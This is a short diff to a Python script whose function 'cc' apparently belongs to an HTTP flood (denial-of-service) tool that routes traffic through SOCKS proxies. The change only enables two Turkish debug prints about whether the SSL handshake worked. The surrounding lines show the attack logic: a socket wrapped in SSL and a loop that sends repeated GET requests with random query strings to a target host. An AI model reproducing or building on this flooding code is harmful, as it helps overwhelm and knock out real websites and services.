@@ -96,9 +96,9 @@ def cc(sockstype,port,cnt):
 				try:
 					ctx = ssl.SSLContext()
 					s = ctx.wrap_socket(s,server_hostname=url)
-					#print ('ssl tamam')
+					print ('ssl tamam')
 				except:
-					#print ('ssl olmadi')
+					print ('ssl olmadi')
 			try:
 				for _ in range(cnt):
 					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + url + "\r\n"
